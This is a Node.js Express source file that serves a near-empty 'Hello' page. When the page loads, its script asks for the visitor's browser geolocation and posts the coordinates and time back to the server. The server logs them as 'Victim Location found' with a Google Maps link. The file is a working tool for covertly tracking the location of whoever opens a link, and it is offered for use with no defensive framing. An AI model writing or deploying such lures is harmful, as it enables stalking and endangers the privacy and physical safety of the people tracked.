const express = require('express');
const app = express();
const PORT = 3000;

app.use(express.json());

app.post('/location', (req, res) => {
  const { latitude, longitude, timestamp } = req.body;
  console.log(' ');
  console.log(' ');
  console.log(' ');
  console.log(' ');
  console.log('Victim Location found');
  console.log(`https://www.google.com/maps/place/${latitude},${longitude}`);
  console.log(`Victim time: ${new Date(timestamp).toLocaleString()}`);
  console.log(' ');
  console.log(' ');
  console.log(' ');
  console.log(' ');
  res.send('Location received.');
});

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title></title>
    </head>
    <body>
      <h1>Hello</h1>

      <script>
        function sendLocation() {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
              const { latitude, longitude } = position.coords;
              const timestamp = new Date().getTime();

              fetch('/location', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({ latitude, longitude, timestamp }),
              })
              .then(response => response.text())
              .then(data => {
                console.log(data);
              })
              .catch(error => {
                console.error('Error:', error);
              });
            });
          } else {
            alert('Geolocation is not supported by this browser.');
          }
        }

        // Automatically send location when the page loads
        window.onload = sendLocation;
      </script>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});